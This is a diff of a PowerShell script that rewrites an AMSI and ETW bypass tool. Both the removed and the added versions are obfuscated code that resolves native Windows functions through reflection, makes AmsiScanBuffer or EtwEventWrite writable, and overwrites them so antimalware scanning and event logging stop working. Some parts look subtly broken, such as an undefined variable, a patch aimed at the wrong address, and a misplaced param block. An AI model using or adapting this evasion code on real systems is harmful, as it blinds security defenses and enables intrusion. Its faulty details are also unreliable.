@@ -1,144 +1,91 @@
-function Invoke-NullAMSI {
-    param
-    (
-        [Parameter(ParameterSetName = 'Interface',
-                   Mandatory = $false,
-                   Position = 0)]
-        [switch]
-        $v,
+function emptyservices_LookupFunc {
+    Param ($moduleName, $functionName)
+    Write-Host "Searching for function '$functionName' in module '$moduleName'..."
 
-        [Parameter(ParameterSetName = 'Interface',
-                   Mandatory = $false,
-                   Position = 0)]
-        [switch]
-        $etw
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+     Equals('System.dll')
+     }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+
+    Write-Host "Assemblies found. Searching for methods..."
+
+    $tmp = @()
+    $assem.GetMethods() | ForEach-Object {
+        If($_.Name -like "Ge*P*oc*ddress") {
+            Write-Host "Method found: $($_.Name)"
+            $tmp += $_
+        }
+    }
+    Write-Host "Address method found, invoking..."
+
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,
+@($moduleName)), $functionName))
+}
+
+
+function emptyservices_getDelegateType {
+    Param (
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]]
+        $func, 
+        [Parameter(Position = 1)] [Type] $delType = [Void]
     )
 
-    # Verbose 
-    if ($v) {
-        $VerbosePreference="Continue"
-    }
+    Write-Host "Creating delegate type for function..."
 
-    ### Obfuscated functions and code ###
-    
-    # Obtaining the address of a Winapi function using native functions with Reflection 
-    function Get-Function
-    {
-        Param(
-            [string] $module,
-            [string] $function
-        )
-        $moduleHandle = $GetModule.Invoke($null, @($module))
-        $tmpPtr = New-Object IntPtr
-        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $moduleHandle)
-        $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
-    }
+    $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
+    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('emptyservicesDelegateType', 'Class, Public, Sealed, AnsiClass,
+    AutoClass', [System.MulticastDelegate])
 
-    # Creating delegate dynamically to call native functions
-    function Get-Delegate
-    {
-        Param (
-            [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
-            [Parameter(Position = 1, Mandatory = $True)] [Type[]] $argTypes,
-            [Parameter(Position = 2)] [Type] $retType = [Void]
-        )
-        $type = [AppDomain]::("Curren" + "tDomain").DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('QD')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
-        DefineDynamicModule('QM', $false).
-        DefineType('QT', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
-        $type.DefineConstructor('RTSpecialName, HideBySig, Public',[System.Reflection.CallingConventions]::Standard, $argTypes).SetImplementationFlags('Runtime, Managed')
-        $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $retType, $argTypes).SetImplementationFlags('Runtime, Managed')
-        $delegate = $type.CreateType()
-        $marshalClass::("GetDelegate" +"ForFunctionPointer")($funcAddr, $delegate)
-    }
+    $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public',
+    [System.Reflection.CallingConventions]::Standard, $func).
+    SetImplementationFlags('Runtime, Managed')
 
-    Write-host "[*] Executing AMSI Patch" -ForegroundColor Cyan
+    $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,
+    $func). SetImplementationFlags('Runtime, Managed')
 
-    try {
-        Add-Type -AssemblyName System.Windows.Forms
-    }
-    catch {
-        Throw "[!] Failed to add WinForms assembly"
-    }
+    Write-Host "Delegate created successfully."
 
-    $marshalClass = [System.Runtime.InteropServices.Marshal]
+    return $type.CreateType()
+}
 
-    # Obfuscate function names with ASCII bytes
-    $bytesGetProc = [Byte[]](0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73)
-    $bytesGetMod =  [Byte[]](0x47, 0x65, 0x74, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65)
+# Ensuring only 'emptyservices -etw' will execute the script
+param (
+    [Parameter(Position = 0, Mandatory = $true)]
+    [ValidateSet("emptyservices -etw", IgnoreCase = $true)]
+    [string]$command
+)
 
-    # Convert byte arrays to strings
-    $GetProc = [System.Text.Encoding]::ASCII.GetString($bytesGetProc)
-    $GetMod = [System.Text.Encoding]::ASCII.GetString($bytesGetMod)
+if ($command -eq "emptyservices -etw") {
+    Write-Host "Command 'emptyservices -etw' recognized. Proceeding with execution..."
 
-    # Get the address of GetModule function
-    $GetModule = $unsafeMethodsType.GetMethod($GetMod)
-    if ($GetModule -eq $null) {
-        Throw "[!] Error obtaining address for $GetMod"
-    }
+    $a = "A"
+    $b = "msiS"
+    $c = "canB"
+    $d = "uffer"
+    Write-Host "Combining function name components..."
 
-    $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
-    if ($GetAddres -eq $null) {
-        Throw "[!] Error obtaining address for $GetProc"
-    }
+    [IntPtr]$emptyservices_funcAddr = emptyservices_LookupFunc amsi.dll ($a + $b + $c + $d)
+    Write-Host "Function address obtained: $emptyservices_funcAddr"
 
-    # Create 4msiInit patch function address
-    $bytes4msiInit = [Byte[]](0x41, 0x6D, 0x73, 0x69, 0x49, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65)
-    $bytes4msi = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
-    $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
-    $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
+    $emptyservices_oldProtectionBuffer = 0
+    Write-Host "Getting delegate for VirtualProtect..."
 
-    $4msiAddr = Get-Function $4msi $4msiInit
-    if ($4msiAddr -eq $null) {
-        Throw "[!] Error obtaining address for $4msiInit"
-    }
+    $emptyservices_vp = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((emptyservices_LookupFunc kernel32.dll VirtualProtect), (emptyservices_getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+    Write-Host "Changing memory permissions..."
 
-    ### Modify methods to use a more flexible approach ###
+    $emptyservices_vp.Invoke($emptyservices_funcAddr, 3, 0x40, [ref]$emptyservices_oldProtectionBuffer)
 
-    Write-Verbose "[*] Patching providers with advanced obfuscation"
-    
-    # Define the patch for provider scan function
-    $PATCH = [byte[]] (0x90, 0x90, 0x90, 0x90, 0x90, 0x90)  # No-op patch, could be used for different effects
+    $emptyservices_buf = [Byte[]] (0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3)
+    Write-Host "Copying bytes to function address..."
 
-    # Apply patch dynamically
-    $patchAddress = Get-Function "kernel32.dll" "VirtualProtect"
-    $protectDelegate = Get-Delegate $patchAddress @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType())
+    [System.Runtime.InteropServices.Marshal]::Copy($emptyservices_buf, 0, $emptyservices_funcAddr, 12)
 
-    Write-Verbose "[*] Changing scan function protection to PAGE_EXECUTE_READWRITE"
-    if (!$protectDelegate.Invoke($patchAddress, 1, 0x40, [ref]$p)) {
-        Throw "[!] Error changing memory protection"
-    }
-
-    # Apply the patch
-    try {
-        $marshalClass::Copy($PATCH, 0, [IntPtr]$patchAddress, 6)
-    } catch {
-        Throw "[!] Failed to apply the patch at $patchAddress"
-    }
-
-    Write-Host "[*] AMSI bypass successful, protection patched." -ForegroundColor Green
-
-    if ($etw) {
-        Write-host "[*] Disabling ETW Logging" -ForegroundColor Cyan
-
-        $etwAddr = Get-Function "ntdll.dll" "EtwEventWrite"
-        if ($etwAddr -eq $null) {
-            Throw "[!] Error obtaining ETW address"
-        }
-
-        Write-Verbose "[*] Changing ETW function protection"
-        if (!$protectDelegate.Invoke($etwAddr, 1, 0x40, [ref]$p)) {
-            Throw "[!] Error changing ETW function permissions"
-        }
-
-        # Apply the RET patch
-        try {
-            $marshalClass::WriteByte($etwAddr, 0xC3)
-        } catch {
-            Throw "[!] Error writing patch to ETW function"
-        }
-
-        Write-Host "[*] ETW patch successful" -ForegroundColor Green
-    }
-
-    Write-Host "[*] ReFUD complete!" -ForegroundColor Green
+    Write-Host "Operation completed successfully."
+} else {
+    Write-Host "Invalid command. Only 'emptyservices -etw' is allowed."
 }
